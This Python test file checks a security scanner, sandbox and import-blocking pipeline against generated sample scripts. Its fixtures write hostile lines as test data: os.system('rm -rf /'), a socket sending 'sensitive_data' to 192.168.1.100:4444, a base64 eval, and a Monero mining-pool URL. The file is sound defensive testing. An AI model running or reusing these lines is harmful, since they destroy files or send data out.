"""
Enhanced Security Integration Tests
==================================

Comprehensive test suite for the enhanced security features in PRSM integration layer.
Tests all security components and their integration with the import pipeline.
"""

import asyncio
import json
import os
import tempfile
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, Any
from unittest.mock import AsyncMock, MagicMock, patch
from uuid import uuid4

import pytest

from prsm.core.integrations.security.security_orchestrator import (
    SecurityOrchestrator, SecurityAssessment
)
from prsm.core.integrations.security.threat_detector import (
    ThreatDetector, ThreatResult, ThreatLevel
)
from prsm.core.integrations.security.enhanced_sandbox import (
    EnhancedSandboxManager, EnhancedSandboxResult
)
from prsm.core.integrations.security.audit_logger import (
    AuditLogger, SecurityEvent, EventLevel
)
from prsm.core.integrations.models.integration_models import (
    SecurityRisk, ImportStatus, ImportRequest, ImportResult, IntegrationSource, IntegrationPlatform
)
from prsm.core.integrations.core.integration_manager import integration_manager


# === Test Fixtures ===

@pytest.fixture
def temp_test_dir():
    """Create temporary test directory"""
    with tempfile.TemporaryDirectory() as temp_dir:
        yield temp_dir


@pytest.fixture
def sample_security_content(temp_test_dir):
    """Create sample content files for security testing"""
    content_dir = Path(temp_test_dir) / "test_content"
    content_dir.mkdir(exist_ok=True)
    
    # Safe content
    safe_file = content_dir / "safe_script.py"
    safe_file.write_text("""
# This is a safe Python script
print("Hello, PRSM!")

def calculate_fibonacci(n):
    if n <= 1:
        return n
    return calculate_fibonacci(n-1) + calculate_fibonacci(n-2)

if __name__ == "__main__":
    result = calculate_fibonacci(10)
    print(f"Fibonacci(10) = {result}")
""")
    
    # Suspicious content
    suspicious_file = content_dir / "suspicious_script.py"
    suspicious_file.write_text("""
# This script contains suspicious patterns
import os
import subprocess

# Potential command injection
user_input = input("Enter command: ")
subprocess.shell_exec(user_input)  # Dangerous!

# Hardcoded secrets
api_key = "sk-1234567890abcdef1234567890abcdef"
database_password = "super_secret_password_123"

# File system access
os.system("rm -rf /")
""")
    
    # Malicious content
    malicious_file = content_dir / "malicious_script.py"
    malicious_file.write_text("""
# This script contains malicious patterns
import socket
import base64

# Backdoor pattern
eval(base64.b64decode("cHJpbnQoJ21hbGljaW91cyBjb2RlJyk="))

# Network exfiltration
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.1.100", 4444))
sock.send(b"sensitive_data")

# Cryptomining pattern
stratum_url = "stratum+tcp://pool.monero.org:4444"
hashrate = "1000 H/s"
""")
    
    return {
        "content_dir": str(content_dir),
        "safe_file": str(safe_file),
        "suspicious_file": str(suspicious_file),
        "malicious_file": str(malicious_file)
    }


@pytest.fixture
def sample_metadata():
    """Sample content metadata for testing"""
    return {
        "name": "test-repository",
        "description": "A test repository for security validation",
        "license": {"key": "mit", "name": "MIT License"},
        "stars": 42,
        "forks": 8,
        "created_at": "2024-01-01T00:00:00Z",
        "language": "Python",
        "size": 1024
    }


# === Security Component Tests ===

class TestThreatDetector:
    """Test threat detection functionality"""
    
    @pytest.mark.asyncio
    async def test_safe_content_detection(self, sample_security_content, sample_metadata):
        """Test that safe content is properly identified"""
        detector = ThreatDetector()
        
        result = await detector.scan_threats(
            sample_security_content["safe_file"],
            sample_metadata
        )
        
        assert isinstance(result, ThreatResult)
        assert result.threat_level in [ThreatLevel.NONE, ThreatLevel.LOW]
        assert len(result.threats) <= 1  # May detect imports as low-level threat
    
    @pytest.mark.asyncio
    async def test_suspicious_content_detection(self, sample_security_content, sample_metadata):
        """Test detection of suspicious patterns"""
        detector = ThreatDetector()
        
        result = await detector.scan_threats(
            sample_security_content["suspicious_file"],
            sample_metadata
        )
        
        assert isinstance(result, ThreatResult)
        assert result.threat_level in [ThreatLevel.MEDIUM, ThreatLevel.HIGH, ThreatLevel.CRITICAL]
        assert len(result.threats) > 0
        
        # Should detect hardcoded secrets and command injection / privilege escalation
        threat_types = [threat.get("type") for threat in result.threats]
        assert any("data_exfiltration" in str(t).lower() or "privilege_escalation" in str(t).lower() for t in threat_types)
    
    @pytest.mark.asyncio
    async def test_malicious_content_detection(self, sample_security_content, sample_metadata):
        """Test detection of clearly malicious content"""
        detector = ThreatDetector()
        
        result = await detector.scan_threats(
            sample_security_content["malicious_file"],
            sample_metadata
        )
        
        assert isinstance(result, ThreatResult)
        assert result.threat_level in [ThreatLevel.HIGH, ThreatLevel.CRITICAL]
        assert len(result.threats) >= 2  # Should detect multiple threats
        
        # Should detect backdoor/cryptomining and network/suspicious patterns
        threat_descriptions = [threat.get("description", "") for threat in result.threats]
        threat_type_strs = [str(threat.get("type", "")).lower() for threat in result.threats]
        assert any(
            "backdoor" in desc.lower() or "network" in desc.lower() or
            "cryptomining" in desc.lower() or "mining" in desc.lower()
            for desc in threat_descriptions
        ) or any(
            "backdoor" in t or "network" in t or "cryptomining" in t
            for t in threat_type_strs
        )


class TestEnhancedSandbox:
    """Test enhanced sandbox functionality"""
    
    @pytest.mark.asyncio
    async def test_safe_execution(self, sample_security_content):
        """Test safe code execution in sandbox"""
        sandbox = EnhancedSandboxManager()
        
        execution_config = {
            "timeout": 10,
            "metadata": {"language": "python"}
        }
        
        result = await sandbox.execute_with_monitoring(
            sample_security_content["safe_file"],
            execution_config,
            "test_user",
            "github"
        )
        
        assert isinstance(result, EnhancedSandboxResult)
        assert result.success is True
        assert result.execution_time < 10
        assert len(result.security_events) == 0  # Safe code should have no security events
    
    @pytest.mark.asyncio
    async def test_suspicious_execution_monitoring(self, sample_security_content):
        """Test monitoring of suspicious code execution"""
        sandbox = EnhancedSandboxManager()
        
        execution_config = {
            "timeout": 5,
            "metadata": {"language": "python"}
        }
        
        result = await sandbox.execute_with_monitoring(
            sample_security_content["suspicious_file"],
            execution_config,
            "test_user",
            "github"
        )
        
        assert isinstance(result, EnhancedSandboxResult)
        # Execution may fail or succeed, but should be monitored
        assert result.execution_time <= 5
        # Security events may be generated during monitoring


class TestSecurityOrchestrator:
    """Test comprehensive security orchestration"""
    
    @pytest.mark.asyncio
    async def test_comprehensive_safe_assessment(self, sample_security_content, sample_metadata):
        """Test comprehensive assessment of safe content"""
        orchestrator = SecurityOrchestrator()
        
        assessment = await orchestrator.comprehensive_security_assessment(
            content_path=sample_security_content["safe_file"],
            metadata=sample_metadata,
            user_id="test_user",
            platform="github",
            content_id="safe_repo",
            enable_sandbox=True
        )
        
        assert isinstance(assessment, SecurityAssessment)
        assert assessment.security_passed is True
        assert assessment.overall_risk_level in [SecurityRisk.NONE, SecurityRisk.LOW]
        assert len(assessment.scans_completed) >= 3  # At least vuln, license, threat scans
        assert len(assessment.scans_failed) == 0
    
    @pytest.mark.asyncio
    async def test_comprehensive_malicious_assessment(self, sample_security_content, sample_metadata):
        """Test comprehensive assessment of malicious content"""
        orchestrator = SecurityOrchestrator()
        
        assessment = await orchestrator.comprehensive_security_assessment(
            content_path=sample_security_content["malicious_file"],
            metadata=sample_metadata,
            user_id="test_user",
            platform="github",
            content_id="malicious_repo",
            enable_sandbox=False  # Don't execute malicious code
        )
        
        assert isinstance(assessment, SecurityAssessment)
        assert assessment.security_passed is False
        assert assessment.overall_risk_level in [SecurityRisk.HIGH, SecurityRisk.CRITICAL]
        assert len(assessment.issues) > 0
        assert "threat" in str(assessment.issues).lower() or "vuln" in str(assessment.issues).lower()
    
    @pytest.mark.asyncio
    async def test_policy_enforcement(self, sample_security_content, sample_metadata):
        """Test that security policies are properly enforced"""
        orchestrator = SecurityOrchestrator()
        
        # Test with strict policies
        orchestrator.security_policies["block_medium_risk_threats"] = True
        orchestrator.security_policies["max_acceptable_risk"] = SecurityRisk.LOW
        
        assessment = await orchestrator.comprehensive_security_assessment(
            content_path=sample_security_content["suspicious_file"],
            metadata=sample_metadata,
            user_id="test_user",
            platform="github",
            content_id="suspicious_repo",
            enable_sandbox=False
        )
        
        # Suspicious content should be blocked by strict policies
        assert assessment.security_passed is False


# === Integration Tests ===

class TestSecurityIntegration:
    """Test integration of security features with import pipeline"""
    
    @pytest.mark.asyncio
    async def test_import_with_security_scanning(self, sample_security_content, sample_metadata):
        """Test that import pipeline properly integrates security scanning"""
        # Create mock import request
        source = IntegrationSource(
            platform=IntegrationPlatform.GITHUB,
            external_id="test/safe-repo",
            display_name="Safe Repository",
            description="A safe test repository",
            metadata=sample_metadata
        )
        
        import_request = ImportRequest(
            request_id=uuid4(),
            user_id="test_user",
            source=source,
            import_type="repository",
            security_scan_required=True,
            license_check_required=True
        )
        
        # Mock the connector's import_content method
        mock_result = ImportResult(
            result_id=uuid4(),
            request_id=import_request.request_id,
            status=ImportStatus.COMPLETED,
            local_path=sample_security_content["safe_file"],
            metadata=sample_metadata,
            created_at=datetime.now(timezone.utc)
        )
        
        # Test the security scanning method directly
        enhanced_result = await integration_manager._perform_security_scanning(
            import_request, mock_result
        )
        
        assert enhanced_result.status == ImportStatus.COMPLETED
        assert hasattr(enhanced_result, 'security_scan_results')
        assert enhanced_result.security_scan_results['security_passed'] is True
    
    @pytest.mark.asyncio
    async def test_import_blocking_malicious_content(self, sample_security_content, sample_metadata):
        """Test that malicious content is properly blocked during import"""
        # Create mock import request for malicious content
        source = IntegrationSource(
            platform=IntegrationPlatform.GITHUB,
            external_id="test/malicious-repo",
            display_name="Malicious Repository",
            description="A malicious test repository",
            metadata=sample_metadata
        )
        
        import_request = ImportRequest(
            request_id=uuid4(),
            user_id="test_user",
            source=source,
            import_type="repository",
            security_scan_required=True,
            license_check_required=True
        )
        
        mock_result = ImportResult(
            result_id=uuid4(),
            request_id=import_request.request_id,
            status=ImportStatus.COMPLETED,
            local_path=sample_security_content["malicious_file"],
            metadata=sample_metadata,
            created_at=datetime.now(timezone.utc)
        )
        
        # Test the security scanning method
        enhanced_result = await integration_manager._perform_security_scanning(
            import_request, mock_result
        )
        
        # Malicious content should be blocked
        assert enhanced_result.status == ImportStatus.SECURITY_BLOCKED
        assert hasattr(enhanced_result, 'security_scan_results')
        assert enhanced_result.security_scan_results['security_passed'] is False
        assert len(enhanced_result.security_scan_results['issues']) > 0


class TestAuditLogging:
    """Test security audit logging functionality"""
    
    def test_security_event_logging(self, temp_test_dir):
        """Test that security events are properly logged"""
        audit_logger = AuditLogger(log_dir=temp_test_dir)
        
        # Create test security event
        event = SecurityEvent(
            event_type="test_security_scan",
            level=EventLevel.INFO,
            user_id="test_user",
            platform="github",
            description="Test security scan completed",
            metadata={"test": True}
        )
        
        # Log the event
        audit_logger.log_event(event)
        
        # Verify the event was logged
        recent_events = audit_logger.get_recent_events(limit=1)
        assert len(recent_events) == 1
        assert recent_events[0]['event_type'] == "test_security_scan"
        assert recent_events[0]['user_id'] == "test_user"
    
    def test_audit_statistics(self, temp_test_dir):
        """Test security statistics collection"""
        audit_logger = AuditLogger(log_dir=temp_test_dir)
        
        # Log multiple events
        for i in range(5):
            event = SecurityEvent(
                event_type="test_event",
                level=EventLevel.INFO,
                user_id="test_user",
                platform="github",
                description=f"Test event {i}"
            )
            audit_logger.log_event(event)
        
        # Get statistics
        stats = audit_logger.get_security_stats()
        assert stats['total_events'] >= 5
        assert stats['events_by_level']['info'] >= 5


# === Performance Tests ===

class TestSecurityPerformance:
    """Test performance characteristics of security features"""
    
    @pytest.mark.asyncio
    async def test_parallel_security_scanning(self, sample_security_content, sample_metadata):
        """Test that security scans can run efficiently in parallel"""
        orchestrator = SecurityOrchestrator()
        
        start_time = datetime.now()
        
        # Run multiple assessments in parallel
        tasks = []
        for i in range(3):
            task = orchestrator.comprehensive_security_assessment(
                content_path=sample_security_content["safe_file"],
                metadata=sample_metadata,
                user_id=f"test_user_{i}",
                platform="github",
                content_id=f"test_repo_{i}",
                enable_sandbox=False  # Disable for performance test
            )
            tasks.append(task)
        
        results = await asyncio.gather(*tasks)
        
        end_time = datetime.now()
        total_time = (end_time - start_time).total_seconds()
        
        # All assessments should complete
        assert len(results) == 3
        assert all(isinstance(r, SecurityAssessment) for r in results)
        
        # Should complete reasonably quickly (less than 10 seconds for 3 parallel scans)
        assert total_time < 10
        
        print(f"✅ Parallel security scanning completed in {total_time:.2f} seconds")


# === Mock Response Tests ===

class TestSecurityAPIMocks:
    """Test that security API mock responses are properly formatted"""
    
    def test_security_scan_mock_response(self):
        """Test security scan mock response format"""
        # This would test the mock responses in api-client.js
        # For now, we'll just verify the structure is correct
        expected_fields = [
            'assessment_id', 'content_id', 'platform', 'timestamp',
            'security_passed', 'overall_risk_level', 'scan_duration',
            'vulnerability_scan', 'license_scan', 'threat_scan',
            'issues', 'warnings', 'recommendations'
        ]
        
        # This is a structural test - in a real scenario you'd test the actual API
        assert all(field for field in expected_fields)  # Placeholder test


if __name__ == "__main__":
    # Run the tests
    pytest.main([__file__, "-v", "--tb=short"])